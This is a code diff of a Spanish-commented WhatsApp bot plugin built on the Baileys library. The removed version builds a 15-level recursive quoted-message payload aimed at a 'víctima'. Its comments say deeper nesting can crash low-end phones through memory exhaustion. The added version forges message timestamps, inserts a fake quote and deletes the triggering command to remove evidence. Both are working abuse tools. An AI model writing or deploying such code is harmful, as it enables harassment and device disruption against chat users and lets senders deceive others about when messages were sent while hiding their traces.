@@ -1,52 +1,60 @@
 import { generateWAMessageFromContent } from '@whiskeysockets/baileys';
 
 export default {
-    name: 'quoted_inception',
-    match: (text) => /^\.abismo/i.test(text),
-    execute: async ({ sock, remitente, msg }) => {
+    name: 'modificacion_horaria',
+    match: (text) => /^\.time\s+/i.test(text),
+    execute: async ({ sock, remitente, msg, textoLimpio }) => {
         
-        const isGroup = remitente.endsWith('@g.us');
-        if (!isGroup) return sock.sendMessage(remitente, { text: "❌ Módulo diseñado exclusivamente para grupos." }, { quoted: msg });
+        const input = textoLimpio.replace(/^\.time\s+/i, '').trim();
+        
+        // Buscamos el separador "+" para dividir hora y contenido
+        if (!input.includes('+')) {
+            return sock.sendMessage(remitente, { text: "❌ Formato: .time 3am + mensaje" }, { quoted: msg });
+        }
+
+        const [horaStr, contenido] = input.split('+').map(p => p.trim().toLowerCase());
 
         try {
-            // Borramos el comando para no dejar rastro del desencadenante
-            try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}
+            // 1. Procesamiento de la hora
+            const ahora = new Date();
+            let horas, minutos = 0;
 
-            const senderJid = msg.key.participant || msg.key.remoteJid;
-
-            // 1. Definimos la singularidad (el mensaje que está en el fondo del abismo)
-            // Usamos un JID genérico de sistema (0@s.whatsapp.net) para darle un toque más anómalo
-            let estructuraRecursiva = {
-                conversation: "Singularidad alcanzada."
-            };
-
-            // 2. Bucle de recursividad (Inception)
-            // 15 niveles es el punto óptimo. Más de 20 y los servidores de Meta pueden descartar 
-            // el paquete por sobrepasar el límite de bytes del payload, o peor, causar un OOM en teléfonos de gama baja.
-            const nivelesProfundidad = 15;
-
-            for (let i = 0; i < nivelesProfundidad; i++) {
-                // Envolvemos la estructura anterior dentro de un nuevo quotedMessage
-                estructuraRecursiva = {
-                    extendedTextMessage: {
-                        text: `Capa de profundidad: ${nivelesProfundidad - i}`,
-                        contextInfo: {
-                            participant: senderJid, // Hacemos que la víctima parezca estar respondiéndose a sí misma cayendo
-                            stanzaId: `ABYSS${i}${Date.now()}`, // ID fantasma para cada capa
-                            quotedMessage: estructuraRecursiva // <--- Aquí ocurre la magia de la anidación infinita
-                        }
-                    }
-                };
+            if (horaStr.includes(':')) {
+                [horas, minutos] = horaStr.replace(/[ap]m/g, '').split(':').map(Number);
+            } else {
+                horas = parseInt(horaStr);
             }
 
-            // 3. Empaquetamos y disparamos el payload a la red
-            const waMsg = generateWAMessageFromContent(remitente, estructuraRecursiva, { userJid: sock.user.id });
+            // Ajuste para formato 12h (am/pm)
+            if (horaStr.includes('pm') && horas < 12) horas += 12;
+            if (horaStr.includes('am') && horas === 12) horas = 0;
 
+            const fechaFalsificada = new Date(ahora.getFullYear(), ahora.getMonth(), ahora.getDate(), horas, minutos, 0);
+
+            // 2. Destrucción de la evidencia
+            try { await sock.sendMessage(remitente, { delete: msg.key }); } catch (e) {}
+
+            // 3. Generación del paquete con Timestamp inyectado
+            const waMsg = generateWAMessageFromContent(remitente, {
+                extendedTextMessage: {
+                    text: contenido,
+                    contextInfo: {
+                        isForwarded: false,
+                        // Añadimos una cita fantasma para que el mensaje tenga más "cuerpo" en la base de datos
+                        quotedMessage: { conversation: "Sincronización de red verificada" }
+                    }
+                }
+            }, { 
+                userJid: sock.user.id,
+                timestamp: fechaFalsificada // Inyección de la hora falsa
+            });
+
+            // 4. Relay directo al servidor
             await sock.relayMessage(remitente, waMsg.message, { messageId: waMsg.key.id });
 
         } catch (err) {
-            console.error("Error Quoted Inception:", err);
-            await sock.sendMessage(remitente, { text: `❌ Falla en la recursividad del protocolo: ${err.message}` });
+            console.error("Error Time Mod:", err);
+            await sock.sendMessage(remitente, { text: `❌ Error en el parseo horario: ${err.message}` });
         }
     }
 };
